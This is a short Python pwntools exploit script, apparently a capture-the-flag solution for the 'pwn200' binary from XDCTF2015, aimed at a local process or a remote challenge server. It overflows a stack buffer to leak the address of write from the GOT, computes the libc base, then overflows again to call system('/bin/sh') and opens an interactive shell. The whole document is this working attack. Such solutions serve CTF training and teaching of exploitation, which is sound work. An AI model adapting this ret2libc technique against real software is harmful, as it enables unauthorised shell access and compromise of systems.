from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwn200")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn200")
else:
	p = remote("111.198.29.45",32623)
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
	elf = ELF("./pwn200")

main_addr = 0x080484BE
padding = "a"*(0x6C + 4)
p3_ret = 0x080485cd
payload = padding + p32(elf.plt["write"]) + p32(p3_ret) + p32(1) + p32(elf.got["write"]) + p32(4) + p32(main_addr)
p.sendafter("XDCTF2015~!\n",payload)

write_addr = u32(p.recv(4))
print hex(write_addr)
libc.address = write_addr - libc.symbols["write"]
log.success("libc_base:"+hex(libc.address))

system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = padding + p32(system) + "junk" + p32(binsh)
p.sendafter("XDCTF2015~!\n",payload)
p.interactive()
